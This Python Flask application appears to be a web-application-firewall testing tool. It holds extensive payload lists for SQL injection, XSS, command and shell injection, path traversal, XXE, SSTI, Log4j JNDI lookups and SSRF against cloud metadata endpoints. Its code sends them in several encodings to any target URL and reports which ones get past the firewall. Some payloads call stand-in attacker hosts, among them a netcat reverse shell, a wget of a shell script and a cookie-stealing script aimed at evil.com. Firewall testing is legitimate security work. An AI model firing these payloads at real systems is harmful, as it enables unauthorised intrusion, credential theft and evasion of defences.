import time
import urllib.parse
import base64
import json
from flask import Flask, render_template, request, jsonify, Response
import requests as http_requests

app = Flask(__name__)

ATTACK_PAYLOADS = {
    "SQLi": [
        "(select(0)from(select(sleep(15)))v)/*'+(select(0)from(select(sleep(15)))v)+'\"+(select(0)from(select(sleep(15)))v)+\"*/",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "1' ORDER BY 1--",
        "1 UNION SELECT NULL--",
        "' UNION SELECT username, password FROM users--",
        "-1134')  OR JSON_EXTRACT('{\"aKER\": 9648}', '$.aKER') = 9648*7799 AND ('QlYa' LIKE 'QlYa",
        "123) AND 12=12  AND JSON_DEPTH('{}') != 2521",
        "1; DROP TABLE users--",
        "admin'--",
        "1' AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert(1)</script>',table_name FROM information_schema.tables WHERE 2>1--",
        "' HAVING 1=1 --",
        "' GROUP BY columnnames having 1=1 --",
        "1 AND (SELECT COUNT(*) FROM sysobjects) > 0",
        "3;DECLARE @c varchar(255);SELECT @c='ping '+master.sys.fn_varbintohexstr(convert(varbinary,SYSTEM_USER))+'.000.burpcollaborator.net'; EXEC Master.dbo.xp_cmdshell @c;",
    ],
    "XSS": [
        "<script>alert('XSS')</script>",
        "<body onload=alert('test1')>",
        "<IMG SRC=j&#X41vascript:alert('test')>",
        "<svg onload=alert(document.domain)>",
        "<img src=x onerror=alert(document.domain)>/all",
        "'\"onwheel=alert(111)'",
        "javascript:setInterval('ale'+'rt(document.domain)')",
        "confirm.call(null,1)",
        "(alert)(1)",
        "<svg/onload=alert(1)//",
        "'\"onClick=\"(prompt)(1)'",
        "\"'>alert(1)</script><script/1='\"",
        "'\"//Onx=\"\"//onfocus=prompt(1)>'",
        "'\"Onx=() onMouSeoVer=prompt(1)>'",
        "'\"OnCliCk=\"(prompt`1`)'",
        "alert.apply(null, [1])",
        "\"autof<x>ocus o<x>nfocus=alert<x>(1)//",
        "'\"><svg onmouseover=\"confirm&#0000000040document.domain)\"",
        "'\\'\\'-alert(1)//'",
        "__proto__[v-if]=_c.constructor('alert(1)()'",
        "'&lt;svg/onload&equals;alert(1)&gt;'",
        "'\"<p only=1337 onmouseenter=window.location.href=//attacker.site>",
    ],
    "RCE": [
        "ax--exec=`id`--remote=origin",
        "; cat /et'c/pa'ss'wd",
        "cmd=127.0.0.1 && ls /etc",
        "; id",
        "| id",
        "`id`",
        "$(id)",
        "; cat /etc/passwd",
        "| cat /etc/shadow",
        "& ping -c 10 127.0.0.1 &",
        "; wget http://attacker.com/shell.sh",
        "| curl http://attacker.com/shell.sh",
    ],
    "Path Traversal": [
        "/static/img/../../etc/passwd",
        "\\\\::1\\c$\\users\\default\\ntuser.dat",
        "....//....//etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "....\\\\....\\\\etc\\\\passwd",
        "/etc/passwd%00.jpg",
        "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    ],
    "Shell Injection": [
        "';wget http://some_host/sh311.sh'",
        "'|getent+hosts+somehost.burpcollaborator.net.&'",
        "';getent$IFS$9hosts$IFS$9somehost.burpcollaborator.net;echo$IFS$9$((3482*7301));'",
        "'| set /a 3482*7301'",
        "| ls -la",
        "; nc -e /bin/sh attacker.com 4444",
        "& nslookup attacker.com &",
    ],
    "NoSQL Injection": [
        "db.injection.insert({success:1});",
        "true, $where: '99 == 88'",
        "', $or: [ {}, { 'order':'order",
        ";var date = new Date(); do{curDate = new Date();}while(curDate-date<10000)",
        "0;var date=new Date(); do{curDate = new Date();}while(curDate-date<10000)",
        '{"$gt": ""}',
        '{"$ne": 1}',
        '{"$where": "sleep(5000)"}',
    ],
    "XXE": [
        '<!DOCTYPE x SYSTEM "//x/x" > <x>a</x>',
        '<!DOCTYPE x [ <!ENTITY % y SYSTEM "//y/y" > %y; ]><x>a</x>',
        '<!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://host/text.txt" > ] > <foo>&xxe;</foo>',
        '<!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>',
        '<?xml version="1.0" encoding="utf-8" standalone="no" ?><xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema"><xs:include namespace="http://xxe-namespace.yourdomain.com/"/></xs:schema>',
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE x [<!ENTITY % xxe PUBLIC "any_text" "http://evil.com/evil.dtd">%xxe;]><root>&xxe;</root>',
    ],
    "SSTI": [
        '<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}',
        "aaaa\\u0027%2b#{16*8787}%2b\\u0027bbb",
        "{{1337*1338}}",
        "{{config}}",
        "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "${7*7}",
        "<%= 7*7 %>",
    ],
    "LDAP Injection": [
        "(&(uid=admin)(!(&(1=0)(userPassword=q))))",
        "*(|(objectclass=*))",
        "userPassword:2.5.13.18:=123",
        "*)(&",
        "*)(uid=*))(|(uid=*",
    ],
    "CRLF": [
        "%0d%0aSet-Cookie:crlf=injection",
        "%0a%0dSet-cookie:crlf=injection",
        "%25%30%41Set-cookie:crlf=injection",
        "%25%30%41%25%30%44Set-cookie:crlf=injection",
        "%25%30%44%25%30%41Set-cookie:crlf=injection",
        "%25%0a%0aSet-cookie:crlf=injection",
        "%e5%98%8dSet-cookie%3acrlf%3dinjection",
    ],
    "SSI": [
        '<!--#exec cmd="wget http://some_host/shell.txt | rename shell.txt shell.php"-->',
        '<!--#exec cmd="ls" -->',
        '<!--#exec cmd="dir" -->',
        '<!--#include virtual="/etc/passwd" -->',
    ],
    "Mail Injection": [
        "\\r\\nV100 CAPABILITY\\r\\nV101 FETCH 4791",
        "\\r\\nQUIT\\r\\n",
        "\\nRCPT TO: test@evil.com\\n",
        "test@test.com\\r\\nCC: victim@example.com",
    ],
}

# AWS WAF Managed Rules specific payloads
# Mapped to AWS WAF rule groups for accurate reporting
AWS_WAF_PAYLOADS = {
    "AWS-CRS-Size": [
        "A" * 8192,
        "B" * 16384,
        "param=" + "X" * 10000,
    ],
    "AWS-CRS-SQLi": [
        "' OR 1=1--",
        "1' WAITFOR DELAY '0:0:15'--",
        "'; EXEC xp_cmdshell('dir');--",
        "1 AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
        "' UNION ALL SELECT NULL,NULL,CONCAT(0x717a707071,IFNULL(CAST(schema_name AS CHAR),0x20),0x7162627171) FROM INFORMATION_SCHEMA.SCHEMATA#",
        "1; UPDATE users SET password='hacked' WHERE username='admin'--",
        "') OR ('x'='x",
        "1' AND BENCHMARK(10000000,SHA1('test'))--",
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "admin' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
    ],
    "AWS-CRS-XSS": [
        '<script>document.location="http://evil.com/?c="+document.cookie</script>',
        '<img src=1 onerror="eval(atob(\'YWxlcnQoMSk=\'))">',
        "<details open ontoggle=alert(1)>",
        '<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">',
        "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
        '<input onfocus=alert(1) autofocus="">',
        '<marquee onstart=alert(1)>',
        '<video><source onerror="javascript:alert(1)">',
        '<isindex type=image src=1 onerror=alert(1)>',
        "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
    ],
    "AWS-CRS-LFI": [
        "/proc/self/environ",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://input",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
        "/var/log/apache2/access.log",
        "/var/log/auth.log",
        "expect://id",
        "file:///etc/shadow",
        "/proc/self/fd/0",
    ],
    "AWS-CRS-RFI": [
        "http://evil.com/shell.txt?",
        "https://raw.githubusercontent.com/test/test/main/shell.php",
        "ftp://evil.com/pub/shell.txt",
        "\\\\evil.com\\share\\shell.php",
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://100.100.100.200/latest/meta-data/",
    ],
    "AWS-BadInputs-Log4j": [
        "${jndi:ldap://evil.com/a}",
        "${jndi:rmi://evil.com/a}",
        "${jndi:dns://evil.com/a}",
        "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:l}dap://evil.com/a}",
        "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com/a}",
        "${j${::-n}di:ldap://evil.com/a}",
        "${jndi:ldap://127.0.0.1#evil.com:1389/a}",
        "${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//evil.com/a}",
        "${${lower:${lower:jndi}}:${lower:ldap}://evil.com/a}",
        "${${upper:jndi}:${upper:ldap}://evil.com/a}",
    ],
    "AWS-BadInputs-JavaDeser": [
        "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==",
        "aced0005",
        'O:8:"PHPClass":1:{s:4:"test";s:4:"test";}',
        "YToxOntzOjQ6InRlc3QiO3M6NDoidGVzdCI7fQ==",
        "__VIEWSTATE=/wEPDwUKMTAyNjczOTc0Ng==",
    ],
    "AWS-BadInputs-SSRF": [
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.170.2/v2/credentials",
        "http://[fd00:ec2::254]/latest/meta-data/",
        "http://instance-data/latest/meta-data/",
        "http://169.254.169.254/latest/api/token",
        "http://169.254.169.254/latest/user-data/",
        "http://169.254.169.254/latest/dynamic/instance-identity/document",
        "http://2852039166/latest/meta-data/",
        "http://0xA9FEA9FE/latest/meta-data/",
        "http://0251.0376.0251.0376/latest/meta-data/",
        "http://[::ffff:169.254.169.254]/latest/meta-data/",
    ],
    "AWS-BotControl-UA": [
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        "Wget/1.21",
        "curl/7.68.0",
        "python-requests/2.28.0",
        "Go-http-client/1.1",
        "Java/1.8.0_201",
        "libwww-perl/6.05",
        "PHP/7.4.3",
        "sqlmap/1.4",
        "nikto/2.1.6",
        "nmap scripting engine",
        "masscan/1.0",
        "dirbuster",
        "gobuster/3.1",
        "nuclei",
        "httpx",
    ],
    "AWS-RateLimit": [],
}

# Mapping of AWS WAF rule groups for reporting
AWS_RULE_GROUP_MAP = {
    "AWS-CRS-Size": "AWSManagedRulesCommonRuleSet (SizeRestrictions)",
    "AWS-CRS-SQLi": "AWSManagedRulesSQLiRuleSet",
    "AWS-CRS-XSS": "AWSManagedRulesCommonRuleSet (CrossSiteScripting)",
    "AWS-CRS-LFI": "AWSManagedRulesCommonRuleSet (LocalFileInclusion)",
    "AWS-CRS-RFI": "AWSManagedRulesCommonRuleSet (RemoteFileInclusion)",
    "AWS-BadInputs-Log4j": "AWSManagedRulesKnownBadInputsRuleSet (Log4JRCE)",
    "AWS-BadInputs-JavaDeser": "AWSManagedRulesKnownBadInputsRuleSet (JavaDeserialization)",
    "AWS-BadInputs-SSRF": "AWSManagedRulesAmazonIpReputationList / SSRF",
    "AWS-BotControl-UA": "AWSManagedRulesBotControlRuleSet",
    "AWS-RateLimit": "Rate-based Rule",
    "SQLi": "General SQLi",
    "XSS": "General XSS",
    "RCE": "General RCE",
    "Path Traversal": "General Path Traversal",
    "Shell Injection": "General Shell Injection",
    "NoSQL Injection": "General NoSQL Injection",
    "XXE": "General XXE",
    "SSTI": "General SSTI",
    "LDAP Injection": "General LDAP Injection",
    "CRLF": "General CRLF",
    "SSI": "General SSI",
    "Mail Injection": "General Mail Injection",
}

ALL_PAYLOADS = {**ATTACK_PAYLOADS, **{k: v for k, v in AWS_WAF_PAYLOADS.items() if v}}


def encode_payload(payload, encoding):
    if encoding == "plain":
        return payload
    elif encoding == "url":
        return urllib.parse.quote(payload, safe="")
    elif encoding == "double-url":
        return urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe="")
    elif encoding == "base64":
        return base64.b64encode(payload.encode()).decode()
    elif encoding == "unicode":
        return "".join(
            f"\\u{ord(c):04x}" if ord(c) > 127 else c for c in payload
        )
    return payload


def classify_response(status_code, body, headers=None):
    aws_waf_info = {}
    if headers:
        for h in ("x-amzn-waf-action", "x-amzn-requestid", "x-amz-cf-id", "server"):
            if h in headers:
                aws_waf_info[h] = headers[h]

    if status_code == 0:
        return "error", aws_waf_info
    # 3xx redirects are not WAF blocks
    if 300 <= status_code < 400:
        return "passed", aws_waf_info
    if status_code in (403, 406, 429, 493):
        return "blocked", aws_waf_info
    if status_code >= 500:
        return "blocked", aws_waf_info
    # Only check body keywords on non-redirect responses
    if body and any(
        word in body.lower()
        for word in ["blocked", "forbidden", "denied", "request blocked",
                     "not acceptable", "violation"]
    ):
        return "blocked", aws_waf_info
    return "passed", aws_waf_info


def send_request(url, method, headers, body, timeout, follow_redirects=True):
    start = time.time()
    try:
        if method == "GET":
            resp = http_requests.get(url, headers=headers, timeout=timeout,
                                     verify=False, allow_redirects=follow_redirects)
        else:
            resp = http_requests.request(method, url, headers=headers, data=body,
                                         timeout=timeout, verify=False,
                                         allow_redirects=follow_redirects)
        elapsed = int((time.time() - start) * 1000)
        resp_body = resp.text[:2000]
        resp_headers = dict(resp.headers)
        status, waf_info = classify_response(resp.status_code, resp_body, resp_headers)
        return {
            "http_status": resp.status_code,
            "time": elapsed,
            "status": status,
            "waf_info": waf_info,
        }
    except http_requests.exceptions.Timeout:
        elapsed = int((time.time() - start) * 1000)
        return {"http_status": 0, "time": elapsed, "status": "error",
                "detail": "timeout", "waf_info": {}}
    except Exception as e:
        elapsed = int((time.time() - start) * 1000)
        return {"http_status": 0, "time": elapsed, "status": "error",
                "detail": str(e), "waf_info": {}}


def prepare_request(target_url, injection_point, encoded_payload, custom_headers, is_bot_ua=False):
    headers = dict(custom_headers)
    url = target_url
    body = None

    if is_bot_ua:
        headers["User-Agent"] = encoded_payload
        return url, headers, body

    if injection_point == "url-param":
        sep = "&" if "?" in url else "?"
        url = f"{url}{sep}test={encoded_payload}"
    elif injection_point == "url-path":
        url = url.rstrip("/") + "/" + encoded_payload
    elif injection_point == "header":
        headers["X-Test"] = encoded_payload
    elif injection_point == "cookie":
        headers["Cookie"] = f"test={encoded_payload}"
    else:
        headers["Content-Type"] = "application/x-www-form-urlencoded"
        body = f"test={encoded_payload}"

    return url, headers, body


@app.route("/")
def index():
    return render_template("index.html",
                           categories=ATTACK_PAYLOADS,
                           aws_categories=AWS_WAF_PAYLOADS,
                           rule_group_map=AWS_RULE_GROUP_MAP)


@app.route("/api/categories")
def get_categories():
    result = {cat: len(payloads) for cat, payloads in ATTACK_PAYLOADS.items()}
    result["__aws__"] = {cat: len(payloads) for cat, payloads in AWS_WAF_PAYLOADS.items()}
    return jsonify(result)


@app.route("/api/test/connection", methods=["POST"])
def test_connection():
    data = request.get_json()
    target_url = data.get("target_url", "")
    timeout = data.get("timeout", 10)

    checks = {}

    # 1. DNS resolution
    try:
        from urllib.parse import urlparse
        import socket
        parsed = urlparse(target_url)
        hostname = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        start = time.time()
        ip = socket.gethostbyname(hostname)
        dns_time = int((time.time() - start) * 1000)
        checks["dns"] = {"status": "ok", "ip": ip, "time": dns_time}
    except Exception as e:
        checks["dns"] = {"status": "error", "detail": str(e)}

    # 2. TCP connection
    try:
        import socket
        start = time.time()
        sock = socket.create_connection((hostname, port), timeout=timeout)
        tcp_time = int((time.time() - start) * 1000)
        sock.close()
        checks["tcp"] = {"status": "ok", "port": port, "time": tcp_time}
    except Exception as e:
        checks["tcp"] = {"status": "error", "detail": str(e)}

    # 3. HTTP request (normal, no payload)
    start = time.time()
    try:
        resp = http_requests.get(target_url, timeout=timeout, verify=False,
                                 allow_redirects=True,
                                 headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
        http_time = int((time.time() - start) * 1000)
        resp_headers = dict(resp.headers)
        server = resp_headers.get("server", resp_headers.get("Server", ""))
        powered_by = resp_headers.get("x-powered-by", resp_headers.get("X-Powered-By", ""))
        waf_headers = {}
        for h in ("x-amzn-waf-action", "x-amz-cf-id", "x-amzn-requestid",
                   "x-cache", "via", "x-amz-cf-pop"):
            val = resp_headers.get(h, resp_headers.get(h.title(), ""))
            if val:
                waf_headers[h] = val
        checks["http"] = {
            "status": "ok",
            "http_status": resp.status_code,
            "time": http_time,
            "server": server,
            "powered_by": powered_by,
            "waf_headers": waf_headers,
            "final_url": resp.url,
            "redirected": resp.url != target_url,
            "content_length": len(resp.content),
        }
    except http_requests.exceptions.SSLError as e:
        http_time = int((time.time() - start) * 1000)
        checks["http"] = {"status": "error", "detail": f"SSL error: {e}", "time": http_time}
    except http_requests.exceptions.Timeout:
        http_time = int((time.time() - start) * 1000)
        checks["http"] = {"status": "error", "detail": "timeout", "time": http_time}
    except Exception as e:
        http_time = int((time.time() - start) * 1000)
        checks["http"] = {"status": "error", "detail": str(e), "time": http_time}

    # 4. WAF detection (send a known-bad request to see if it's blocked)
    try:
        start = time.time()
        waf_resp = http_requests.get(
            target_url,
            params={"test": "<script>alert(1)</script>"},
            timeout=timeout, verify=False, allow_redirects=True,
            headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
        waf_time = int((time.time() - start) * 1000)
        waf_detected = waf_resp.status_code in (403, 406, 429, 493)
        if not waf_detected and waf_resp.text:
            waf_detected = any(w in waf_resp.text.lower() for w in
                             ["blocked", "forbidden", "request blocked", "not acceptable"])
        checks["waf_probe"] = {
            "status": "ok",
            "http_status": waf_resp.status_code,
            "time": waf_time,
            "waf_detected": waf_detected,
        }
    except Exception as e:
        checks["waf_probe"] = {"status": "error", "detail": str(e)}

    all_ok = all(c.get("status") == "ok" for c in checks.values())
    return jsonify({"ok": all_ok, "checks": checks})


@app.route("/api/test", methods=["POST"])
def run_single_test():
    data = request.get_json()
    target_url = data.get("target_url", "")
    method = data.get("method", "GET")
    payload = data.get("payload", "")
    encoding = data.get("encoding", "plain")
    injection_point = data.get("injection_point", "body-param")
    custom_headers = data.get("custom_headers", {})
    timeout = data.get("timeout", 10)

    encoded_payload = encode_payload(payload, encoding)
    url, headers, body = prepare_request(target_url, injection_point,
                                          encoded_payload, custom_headers)

    result = send_request(url, method, headers, body, timeout)
    return jsonify(result)


@app.route("/api/test/batch", methods=["POST"])
def run_batch_test():
    data = request.get_json()
    target_url = data.get("target_url", "")
    method = data.get("method", "GET")
    categories = data.get("categories", [])
    encodings = data.get("encodings", ["plain"])
    injection_point = data.get("injection_point", "body-param")
    custom_headers = data.get("custom_headers", {})
    delay_ms = data.get("delay", 200)
    timeout = data.get("timeout", 10)
    follow_redirects = data.get("follow_redirects", True)

    def generate():
        index = 0
        total = sum(
            len(ALL_PAYLOADS.get(cat, [])) * len(encodings)
            for cat in categories
            if cat != "AWS-RateLimit"
        )
        rate_limit_count = 0
        if "AWS-RateLimit" in categories:
            rate_limit_count = data.get("rate_limit_count", 120)
            total += rate_limit_count

        yield json.dumps({"type": "start", "total": total}) + "\n"

        for cat in categories:
            if cat == "AWS-RateLimit":
                continue
            is_bot_ua = (cat == "AWS-BotControl-UA")
            for payload in ALL_PAYLOADS.get(cat, []):
                for enc in encodings:
                    index += 1
                    if is_bot_ua:
                        encoded_payload = payload
                    else:
                        encoded_payload = encode_payload(payload, enc)

                    url, headers, body = prepare_request(
                        target_url, injection_point, encoded_payload,
                        custom_headers, is_bot_ua=is_bot_ua)

                    resp = send_request(url, method, headers, body, timeout, follow_redirects)
                    result = {
                        "type": "result",
                        "index": index,
                        "category": cat,
                        "payload": payload[:200],
                        "encoding": "UA" if is_bot_ua else enc,
                        "status": resp["status"],
                        "http_status": resp["http_status"],
                        "time": resp["time"],
                        "rule_group": AWS_RULE_GROUP_MAP.get(cat, ""),
                        "waf_info": resp.get("waf_info", {}),
                    }
                    yield json.dumps(result) + "\n"

                    if delay_ms > 0:
                        time.sleep(delay_ms / 1000.0)

        if "AWS-RateLimit" in categories and rate_limit_count > 0:
            rate_delay = data.get("rate_limit_delay", 50)
            for i in range(rate_limit_count):
                index += 1
                url, headers, body = prepare_request(
                    target_url, injection_point, "", custom_headers)
                resp = send_request(url, method, headers, body, timeout, follow_redirects)
                result = {
                    "type": "result",
                    "index": index,
                    "category": "AWS-RateLimit",
                    "payload": f"Request #{i + 1}",
                    "encoding": "none",
                    "status": resp["status"],
                    "http_status": resp["http_status"],
                    "time": resp["time"],
                    "rule_group": "Rate-based Rule",
                    "waf_info": resp.get("waf_info", {}),
                }
                yield json.dumps(result) + "\n"
                if rate_delay > 0:
                    time.sleep(rate_delay / 1000.0)

        yield json.dumps({"type": "done"}) + "\n"

    return Response(generate(), mimetype="application/x-ndjson")


@app.route("/api/report", methods=["POST"])
def generate_report():
    data = request.get_json()
    results = data.get("results", [])

    rule_group_stats = {}
    for r in results:
        rg = r.get("rule_group") or AWS_RULE_GROUP_MAP.get(r.get("category", ""), "Other")
        if rg not in rule_group_stats:
            rule_group_stats[rg] = {"blocked": 0, "passed": 0, "error": 0, "total": 0}
        rule_group_stats[rg]["total"] += 1
        rule_group_stats[rg][r.get("status", "error")] += 1

    total = len(results)
    blocked = sum(1 for r in results if r.get("status") == "blocked")
    passed = sum(1 for r in results if r.get("status") == "passed")

    report = {
        "summary": {
            "total": total,
            "blocked": blocked,
            "passed": passed,
            "block_rate": round(blocked / total * 100, 1) if total > 0 else 0,
        },
        "rule_groups": rule_group_stats,
        "passed_details": [r for r in results if r.get("status") == "passed"],
    }
    return jsonify(report)


if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    app.run(host="0.0.0.0", port=5000, debug=True)
